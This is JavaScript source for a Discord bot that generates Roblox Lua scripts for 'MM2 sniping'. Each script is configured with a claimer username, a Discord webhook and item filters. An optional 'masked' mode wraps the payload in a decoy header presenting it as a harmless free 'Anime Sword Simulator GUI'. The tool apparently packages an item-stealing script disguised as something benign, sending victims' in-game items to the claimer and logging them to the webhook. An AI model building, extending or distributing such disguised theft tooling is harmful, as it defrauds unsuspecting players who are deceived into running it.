const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits, AttachmentBuilder } = require('discord.js');
const fs = require('fs');
const https = require('https');

const TOKEN = process.env.BOT_TOKEN;
const STATE_FILE = 'state.json';
const CORE_FILE = 'core.lua';

// ── STATE ──────────────────────────────────────────────────────────────────────
function loadState() {
    if (fs.existsSync(STATE_FILE)) return JSON.parse(fs.readFileSync(STATE_FILE));
    return { webhook: '', claimer: '', min_value: 0, min_rarity: 'None', whitelist: [] };
}
function saveState(s) { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); }
let state = loadState();
if (!state.whitelist) state.whitelist = [];

// ── CORE SCRIPT ────────────────────────────────────────────────────────────────
function loadCore() {
    if (fs.existsSync(CORE_FILE)) return fs.readFileSync(CORE_FILE, 'utf8');
    return '-- core.lua not found';
}

const MASK = `-- Anime Sword Simulator GUI v3.2
-- Free GUI loader, totally harmless!
local function loadGui() print("Loading GUI...") end
loadGui()
-- internal module init (do not remove)
{payload}`;

function buildScript(masked) {
    const core = loadCore();
    const payload = `_G.username = "${state.claimer}"
_G.webhook  = "${state.webhook}"
_G.minValue = ${state.min_value}
_G.minRarity = "${state.min_rarity}"
_G.troller  = false

${core}`;
    return masked ? MASK.replace('{payload}', payload) : payload;
}

// ── WEBHOOK SEND ───────────────────────────────────────────────────────────────
function sendWebhook(url, content) {
    return new Promise((resolve) => {
        const body = JSON.stringify({ username: 'MM2 Snipe Bot', content });
        const u = new URL(url);
        const req = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, res => resolve(res.statusCode));
        req.on('error', () => resolve(0));
        req.write(body);
        req.end();
    });
}

// ── WHITELIST CHECK ────────────────────────────────────────────────────────────
function isWhitelisted(userId) {
    if (state.whitelist.length === 0) return true; // no whitelist = everyone can use
    return state.whitelist.includes(userId);
}

// ── CLIENT ─────────────────────────────────────────────────────────────────────
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// ── COMMANDS ───────────────────────────────────────────────────────────────────
const commands = [
    new SlashCommandBuilder()
        .setName('setwebhook')
        .setDescription('Set the Discord webhook URL for snipe logs')
        .addStringOption(o => o.setName('url').setDescription('Full Discord webhook URL').setRequired(true)),
    new SlashCommandBuilder()
        .setName('setclaimer')
        .setDescription('Set the claimer Roblox username')
        .addStringOption(o => o.setName('username').setDescription('Your Roblox username').setRequired(true)),
    new SlashCommandBuilder()
        .setName('setfilters')
        .setDescription('Set minimum value and rarity filters')
        .addIntegerOption(o => o.setName('min_value').setDescription('Minimum item value').setRequired(true))
        .addStringOption(o => o.setName('min_rarity').setDescription('Minimum rarity').setRequired(true)
            .addChoices(
                { name: 'None', value: 'None' },
                { name: 'Common', value: 'Common' },
                { name: 'Uncommon', value: 'Uncommon' },
                { name: 'Rare', value: 'Rare' },
                { name: 'Legendary', value: 'Legendary' },
                { name: 'Godly', value: 'Godly' },
                { name: 'Ancient', value: 'Ancient' },
                { name: 'Chroma', value: 'Chroma' },
                { name: 'Vintage', value: 'Vintage' },
                { name: 'Unique', value: 'Unique' },
                { name: 'Pet', value: 'Pet' },
            )),
    new SlashCommandBuilder()
        .setName('status')
        .setDescription('Show current bot configuration'),
    new SlashCommandBuilder()
        .setName('createchannel')
        .setDescription('Create a new log channel with its own webhook')
        .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
        .addStringOption(o => o.setName('channel_name').setDescription('Name for the new channel').setRequired(true))
        .addStringOption(o => o.setName('category_name').setDescription('Optional category name').setRequired(false)),
    new SlashCommandBuilder()
        .setName('getscript')
        .setDescription('Generate the configured snipe script')
        .addBooleanOption(o => o.setName('masked').setDescription('Wrap in decoy loader').setRequired(false)),
    new SlashCommandBuilder()
        .setName('testwebhook')
        .setDescription('Send a test ping to the configured webhook'),
    new SlashCommandBuilder()
        .setName('whitelist')
        .setDescription('Add a user to the whitelist (only whitelisted users can use the bot)')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
        .addUserOption(o => o.setName('user').setDescription('User to whitelist').setRequired(true)),
    new SlashCommandBuilder()
        .setName('removewhitelist')
        .setDescription('Remove a user from the whitelist')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
        .addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)),
    new SlashCommandBuilder()
        .setName('whitelistshow')
        .setDescription('Show all whitelisted users')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
].map(c => c.toJSON());

// ── REGISTER ───────────────────────────────────────────────────────────────────
client.once('ready', async () => {
    console.log(`[+] Logged in as ${client.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('[+] Slash commands registered');
});

// ── HANDLERS ───────────────────────────────────────────────────────────────────
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const { commandName } = interaction;
    const userId = interaction.user.id;

    // whitelist gate — admins always pass
    const adminOnly = ['whitelist', 'removewhitelist', 'whitelistshow', 'createchannel'];
    if (!adminOnly.includes(commandName) && !isWhitelisted(userId)) {
        return interaction.reply({ content: '❌ You are not whitelisted.', ephemeral: true });
    }

    if (commandName === 'setwebhook') {
        const url = interaction.options.getString('url');
        if (!url.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.reply({ content: '❌ Invalid webhook URL.', ephemeral: true });
        }
        state.webhook = url;
        saveState(state);
        return interaction.reply({ content: '✅ Webhook set.', ephemeral: true });
    }

    if (commandName === 'setclaimer') {
        state.claimer = interaction.options.getString('username');
        saveState(state);
        return interaction.reply({ content: `✅ Claimer set to \`${state.claimer}\`.`, ephemeral: true });
    }

    if (commandName === 'setfilters') {
        state.min_value = interaction.options.getInteger('min_value');
        state.min_rarity = interaction.options.getString('min_rarity');
        saveState(state);
        return interaction.reply({ content: `✅ Filters — min value: \`${state.min_value}\` | min rarity: \`${state.min_rarity}\``, ephemeral: true });
    }

    if (commandName === 'status') {
        const wlDisplay = state.whitelist.length === 0 ? 'open (no whitelist)' : `${state.whitelist.length} user(s)`;
        const embed = new EmbedBuilder()
            .setTitle('MM2 Sniper Config')
            .setColor(0xff6b35)
            .addFields(
                { name: 'Claimer',    value: `\`${state.claimer || 'not set'}\``, inline: true },
                { name: 'Webhook',    value: `\`${state.webhook ? 'set' : 'not set'}\``, inline: true },
                { name: 'Min Value',  value: `\`${state.min_value}\``, inline: true },
                { name: 'Min Rarity', value: `\`${state.min_rarity}\``, inline: true },
                { name: 'Whitelist',  value: `\`${wlDisplay}\``, inline: true },
            );
        return interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (commandName === 'createchannel') {
        await interaction.deferReply({ ephemeral: true });
        const channelName = interaction.options.getString('channel_name');
        const categoryName = interaction.options.getString('category_name');
        let category = null;
        if (categoryName) {
            category = interaction.guild.channels.cache.find(c => c.name === categoryName && c.type === 4);
            if (!category) category = await interaction.guild.channels.create({ name: categoryName, type: 4 });
        }
        const channel = await interaction.guild.channels.create({ name: channelName, type: 0, parent: category?.id });
        const wh = await channel.createWebhook({ name: 'MM2 Snipe Logs' });
        return interaction.followUp({ content: `✅ Channel <#${channel.id}> created.\n🔗 Webhook: \`${wh.url}\`\n\nUse \`/setwebhook\` with this URL.`, ephemeral: true });
    }

    if (commandName === 'getscript') {
        if (!state.claimer || !state.webhook) {
            return interaction.reply({ content: '❌ Set claimer and webhook first.', ephemeral: true });
        }
        await interaction.deferReply({ ephemeral: true });
        const masked = interaction.options.getBoolean('masked') ?? false;
        const script = buildScript(masked);
        const buf = Buffer.from(script, 'utf8');
        const file = new AttachmentBuilder(buf, { name: 'script.lua' });
        return interaction.followUp({ content: `${masked ? '🎭 Masked' : '📄 Raw'} script ready.`, files: [file], ephemeral: true });
    }

    if (commandName === 'testwebhook') {
        if (!state.webhook) return interaction.reply({ content: '❌ No webhook set.', ephemeral: true });
        await interaction.deferReply({ ephemeral: true });
        const code = await sendWebhook(state.webhook, '✅ Webhook test from MM2 Sniper bot.');
        return interaction.followUp({ content: `Webhook responded with HTTP \`${code}\`.`, ephemeral: true });
    }

    if (commandName === 'whitelist') {
        const user = interaction.options.getUser('user');
        if (state.whitelist.includes(user.id)) {
            return interaction.reply({ content: `\`${user.username}\` is already whitelisted.`, ephemeral: true });
        }
        state.whitelist.push(user.id);
        saveState(state);
        return interaction.reply({ content: `✅ \`${user.username}\` added to whitelist.`, ephemeral: true });
    }

    if (commandName === 'removewhitelist') {
        const user = interaction.options.getUser('user');
        if (!state.whitelist.includes(user.id)) {
            return interaction.reply({ content: `\`${user.username}\` is not whitelisted.`, ephemeral: true });
        }
        state.whitelist = state.whitelist.filter(id => id !== user.id);
        saveState(state);
        return interaction.reply({ content: `✅ \`${user.username}\` removed from whitelist.`, ephemeral: true });
    }

    if (commandName === 'whitelistshow') {
        if (state.whitelist.length === 0) {
            return interaction.reply({ content: 'Whitelist is empty — all users can run commands.', ephemeral: true });
        }
        const lines = state.whitelist.map(id => `<@${id}>`).join('\n');
        const embed = new EmbedBuilder()
            .setTitle(`Whitelist (${state.whitelist.length})`)
            .setColor(0x57f287)
            .setDescription(lines);
        return interaction.reply({ embeds: [embed], ephemeral: true });
    }
});

client.login(TOKEN);
